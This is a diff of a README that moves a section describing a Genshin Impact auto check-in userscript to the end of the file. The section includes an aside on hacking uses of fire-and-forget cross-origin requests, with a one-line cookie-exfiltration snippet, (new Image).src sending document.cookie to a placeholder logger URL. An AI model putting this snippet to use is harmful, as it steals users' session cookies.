@@ -3,18 +3,6 @@
 
 
 retrier2.ahk is now available at github!
-## genshin-checkin-redeem.js
-Every 3h script will try to check-in<br>
-__Script will trigger when you are casually watching youtube videos, or just browsing__<br>
-This script will send 2 requests, one will attempt to get checkin game reward, and the other request is another checkin<br>
-I have tested it on other accounts and it should be working for you as well<br>
-#### ALL SERVERS
-Junior Developers may freak out because they'll see error in console, but in the contrary script actually works because request is sent, but the response cannot arrive due CORS
-- This technique is very common in Hacking
-  - It was being used for DoS-ing
-  - Or sending `document.cookie` to the 3rd party logger website
-    - Sending `document.cookie` was mostly sent via `(new Image).src="...?_="+encodeURIComponent(document.cookie)`
-
 
 ## retrier2.ahk SETUP
 FOR pre-made script: <br>https://www.youtube.com/watch?v=7YDn-NKuO7A<br>
@@ -37,4 +25,17 @@ A: Not by the author, but there MAY be a change during period before October of 
 3. Set Display Mode to: 1440x900 Windowed
 4. Go to Settings then Language
 5. Select Subtitles to: English
+
+<br>
+## genshin-checkin-redeem.js
+Every 3h script will try to check-in<br>
+__Script will trigger when you are casually watching youtube videos, or just browsing__<br>
+This script will send 2 requests, one will attempt to get checkin game reward, and the other request is another checkin<br>
+I have tested it on other accounts and it should be working for you as well<br>
+#### ALL SERVERS
+Junior Developers may freak out because they'll see error in console, but in the contrary script actually works because request is sent, but the response cannot arrive due CORS
+- This technique is very common in Hacking
+  - It was being used for DoS-ing
+  - Or sending `document.cookie` to the 3rd party logger website
+    - Sending `document.cookie` was mostly sent via `(new Image).src="...?_="+encodeURIComponent(document.cookie)`
 
